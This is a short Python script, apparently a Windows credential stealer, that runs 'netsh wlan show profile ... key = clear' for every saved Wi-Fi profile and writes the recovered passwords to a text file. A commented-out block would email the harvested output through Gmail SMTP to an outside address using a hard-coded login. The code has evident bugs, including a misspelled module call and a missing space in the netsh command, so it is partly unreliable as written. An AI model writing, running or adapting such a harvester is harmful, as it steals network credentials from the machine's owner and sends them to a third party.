#!/usr/bin/python

import subprocess 
import smtplib
import re

command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
network_list = re.findall('(?:Profiles\s*:\s)(.*)', networks)

final_output = ""

for network in network_list:
    command2 = "netsh wlan show profile " + network + "key = clear"
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result

file = open("wifiPasswords.txt", "w")
file.write(final_output)
file.close()


# server = smtpli.smtp("smtp.gmail.com",587)
# server.starttls()
# server.login("fruganyumisa@gamil.com","testpasswd")
# server.login(email,password)
# server.sendmail("windows32@gmail.com", "windows32@gmail.com", final_output)
# server.quit()


